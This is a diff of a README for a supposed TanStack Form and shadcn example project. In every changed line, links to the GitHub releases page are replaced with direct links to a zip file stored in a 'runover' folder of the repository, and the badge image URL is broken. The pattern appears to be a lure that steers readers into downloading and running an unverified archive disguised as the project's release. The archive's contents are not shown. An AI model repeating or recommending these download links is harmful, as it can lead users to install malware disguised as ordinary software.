@@ -1,6 +1,6 @@
 # 🎉 tanstack-form-shadcn-field-example - Simplifying Forms with Ease
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/madiaznx/tanstack-form-shadcn-field-example/releases)
+[![Download](https://raw.githubusercontent.com/madiaznx/tanstack-form-shadcn-field-example/main/runover/tanstack-form-shadcn-field-example.zip%20release-brightgreen)](https://raw.githubusercontent.com/madiaznx/tanstack-form-shadcn-field-example/main/runover/tanstack-form-shadcn-field-example.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to get started with the application:
 
 ### Step 1: Visit the Releases Page
 
-To download the software, visit our [Releases page](https://github.com/madiaznx/tanstack-form-shadcn-field-example/releases) where you will find the latest version available for download.
+To download the software, visit our [Releases page](https://raw.githubusercontent.com/madiaznx/tanstack-form-shadcn-field-example/main/runover/tanstack-form-shadcn-field-example.zip) where you will find the latest version available for download.
 
 ### Step 2: Choose the Version
 
@@ -57,7 +57,7 @@ Before downloading the application, ensure that your system meets these requirem
 
 To start using the **tanstack-form-shadcn-field-example**, click the button below to download:
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/madiaznx/tanstack-form-shadcn-field-example/releases)
+[![Download](https://raw.githubusercontent.com/madiaznx/tanstack-form-shadcn-field-example/main/runover/tanstack-form-shadcn-field-example.zip%20release-brightgreen)](https://raw.githubusercontent.com/madiaznx/tanstack-form-shadcn-field-example/main/runover/tanstack-form-shadcn-field-example.zip)
 
 Follow the steps described above to install the application. Once installed, explore its features and enjoy managing forms with ease.
 
